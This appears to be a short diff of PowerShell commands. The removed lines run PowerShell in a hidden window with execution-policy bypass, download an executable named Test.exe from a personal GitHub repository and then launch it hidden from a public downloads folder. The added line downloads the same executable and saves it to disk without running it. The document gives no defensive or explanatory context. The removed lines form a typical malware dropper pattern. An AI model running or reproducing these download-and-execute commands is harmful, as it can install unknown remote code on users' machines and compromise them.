@@ -1,2 +1,1 @@
-powershell -WindowStyle Hidden -ep bypass iwr -uri https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe
-powershell.exe -w hidden C:\Users\Public\Downloads\Test.exe
+try{$c=iwr 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe' -UseBasicParsing;$t=$c.Headers.'Content-Type';if($t-match'application/octet-stream|application/x-msdownload'){$c.Content|sc 'C:\Path\To\Downloads\Test.exe' -Force}}catch{Write-Error $_}
